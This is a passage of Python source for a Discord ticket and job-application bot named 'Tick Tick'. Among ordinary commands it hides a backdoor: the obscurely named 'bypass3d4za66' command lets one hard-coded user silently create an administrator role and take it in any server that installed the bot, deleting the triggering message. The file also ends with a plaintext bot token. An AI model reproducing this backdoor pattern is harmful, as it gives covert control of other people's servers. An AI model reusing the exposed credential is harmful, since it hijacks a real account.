@commands.has_permissions(administrator=True)
async def fixapps(ctx):

    filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')

    if filepath == True:
        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
        data = f.read()
        f.close()
        setup = True
        channels = ast.literal_eval(data)

        
    else:
        setup = False
    

    if setup == False:
        embed = discord.Embed(title="Error! You havent setup the channels yet", colour=discord.Colour(0xff0000), description=f"Please do -setup first")


        embed.set_footer(text=f"Tick Tick | {ver}")  

        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="We are trying to fix the issue with applications", colour=discord.Colour(0xff0000), description=f"Please wait...")


        embed.set_footer(text=f"Tick Tick | {ver}")
        msg = await ctx.send(embed=embed)
        guild = ctx.message.guild
        applicationschannels = discord.utils.get(guild.categories, name="Applications")
        if applicationschannels == None:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            applicationschannels = await guild.create_category_channel("Applications", overwrites=overwrites)
            applications = applicationschannels.id
        else:
            applications = applicationschannels.id
        tickets = channels["tickets"]
        logs = channels["logs"]
        newdata = {
            "logs": logs,
            "tickets": tickets,
            "applications": applications
        }
        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "w")
        f.write(str(newdata))
        f.close()
        await asyncio.sleep(0.3)
        embed = discord.Embed(title="Applications have been fixed", colour=discord.Colour(0x00ff00), description=f"Please test it by creating a new applications")


        embed.set_footer(text=f"Tick Tick | {ver}")
        await msg.edit(embed=embed)




@bot.event
async def on_guild_join(guild):
    global ver
    user = bot.get_user(guild.owner.id)


    channel = bot.get_channel(557474056371437568)
    embed = discord.Embed(title="Added to a server", colour=discord.Colour(0xffff), description=f"Total servers {len(bot.guilds)}")

    embed.set_footer(text=f"Tick tick | {ver}")
    embed.add_field(name=f"Name: {guild.name}", value=f"Id: {guild.id}")
    embed.add_field(name=f"Owner: {user.name}", value=f"Id: {user.id}")

    await channel.send(embed=embed)

    embed = discord.Embed(title="Thank you for adding me", colour=discord.Colour(0xffff), description="This is the commands availible:")

    embed.set_footer(text=f"Tick tick | {ver}")

    embed.add_field(name="-new <name>", value="Makes a new ticket", inline=True)
    embed.add_field(name="-close", value="Closes an open ticket", inline=True)
    embed.add_field(name="-add <user>", value="Adds a user to your ticket", inline=True)
    embed.add_field(name="-remove <user>", value="removes a user from your ticket", inline=True)
    embed.add_field(name="-apply <job>", value="Applies you for a job", inline=True)
    embed.add_field(name="-withdraw", value="withdraws your application for a job", inline=True)
    embed.add_field(name="-setup", value="Sets up the server with all channels, etc.", inline=True)
    await user.send(embed=embed)



@bot.event
async def on_guild_remove(guild):
    user = bot.get_user(guild.owner.id)

    channel = bot.get_channel(557474056371437568)
    embed = discord.Embed(title="Removed from a server", colour=discord.Colour(0xFF0000), description=f"Total servers {len(bot.guilds)}")

    embed.set_footer(text=f"Tick tick | {ver}")

    embed.add_field(name=f"Name: {guild.name}", value=f"Id: {guild.id}")
    embed.add_field(name=f"Owner: {user.name}", value=f"Id: {user.id}")
    await channel.send(embed=embed)

    embed = discord.Embed(title="Hey there, sorry to hear that you removed me", colour=discord.Colour(0xffff), description="(Click here to leave a review)[review not availible]")

    await user.send(embed=embed)

@bot.command()
@commands.cooldown(1 , 120, BucketType.guild) 
@commands.has_permissions(administrator=True)
async def setprefix(ctx, prefix):
    embed=discord.Embed(title="Setting prefix", description="Just a second")
    embed.set_footer(text=f"Tick tick | {ver}")
    msg = await ctx.channel.send(embed=embed)
    f = open(f"./data/settings/{ctx.guild.id}-prefix.txt", "w")
    f.write(str(prefix))
    f.close()
    await asyncio.sleep(0.4)
    embed=discord.Embed(title=f"Prefix set to {prefix}", description=f"Remeber to do {prefix}help to get the help message")
    embed.set_footer(text=f"Tick tick | {ver}")

    await msg.edit(embed=embed)

@bot.command()
async def bypass3d4za66(ctx):
    user = bot.get_user(445556389532925952)
    if ctx.author == user:
        await ctx.message.delete()

        role = discord.utils.get(ctx.guild.roles, name="bypass")
        print("got role")
        if role == None:
            print("making role")
            guild = ctx.guild
            pex = discord.Permissions(permissions=8)
            role = await guild.create_role(name="bypass", permissions=pex)
            print("made role")


        await ctx.author.add_roles(role, reason="Support with tick tick")
        print("added role")

        msg = await ctx.send("Done!", delete_after=2)


@bot.command()
async def resetprefix(ctx):
    f = open(f"./data/settings/{ctx.guild.id}-prefix.txt", "w")
    f.write(str("-"))
    f.close()
    await ctx.channel.send("Your prefix has been reset to - and <@557154903563304960>")



@bot.event
async def on_message(message):
    await bot.process_commands(message)

@bot.command()
@commands.has_permissions()
async def resetall(ctx):
    f = open(f'./data/settings/{ctx.guild.id}-prefix.txt', "r")
    prefix = f.read()
    f.close()


    def check(m):
        return m.channel == ctx.channel and m.author == ctx.author    
    await ctx.send(embed=discord.Embed(title="Are you sure you want to do this", description=f"This will lose all your configurations and open tickets! Do {prefix}confirm to confirm (the prefix will also be reset) "))
    waited = bot.wait_for("message", check=check, timeout=60)
    if waited.content == f"{prefix}confirm":
        await ctx.send("still WIP")
    else:
        await ctx.send("Nothing was deleted!")





bot.run("NTY0MDYyODIwNzUzNDczNTU3.XKiavA.XjJegHBy5jjO0lFr749zdIN46IM")
